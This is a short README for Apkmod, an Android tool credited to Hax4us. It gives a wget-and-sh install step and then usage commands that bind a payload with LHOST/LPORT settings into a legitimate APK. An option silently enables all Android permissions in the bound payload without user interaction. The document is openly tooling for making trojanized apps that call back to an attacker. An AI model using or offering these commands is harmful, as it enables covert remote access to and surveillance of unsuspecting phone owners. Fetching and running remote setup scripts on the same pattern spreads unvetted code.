# Apkmod v1.9
### Author : Lokesh @Hax4us

## _Steps For Installation_
1. First goto home directory `$ cd $HOME`
2. Get the setup script `$ wget https://raw.githubusercontent.com/Hax4us/Apkmod/master/setup.sh`
3. Execute the script `$ sh setup.sh`
4. Now you can execute command `$ apkmod`

## Usage :



1. For binding `$ apkmod -b /path/to/originalApp.apk -o /path/to/binded.apk LHOST=127.0.0.1 LPORT=4444`. It will bind payload with __originalApp.apk__ and saves final binded app to __binded.apk__.
2. Now you can use a optional option `-a` to use __aapt2__ for __binding__ and __recompiling__. Why aapt2 ? Because some apps can't recompile with __aapt__ but __aapt2__ can do it. But I can't drop __aapt__ support because some apps can't recompile with __aapt2__ so first recompile or bind without __aapt2__ ( `-a` ) then if you failed then try with __aapt2__. For example `$ apkmod -a -b /path/to/originalApp.apk -o /path/to/binded.apk LHOST=127.0.0.1 LPORT=4444`.
3. Use `-V` to enable verbose output
4. If only editing Java (smali) then this is the recommended action for faster decompile & rebuild `--no-res`
5. If you are only editing the resources. This is the recommended action for faster disassemble & assemble `--no-smali`
6. use `--frame-path` to specify framework directory like `--frame-path=/path/to/dir` 
7. Use `--enable-perm` to enable all android permissions in binded or non binded payloads without user interaction. For example :- `$ apkmod --enable-perm=/path/to/binded.apk -o mybinded.apk`







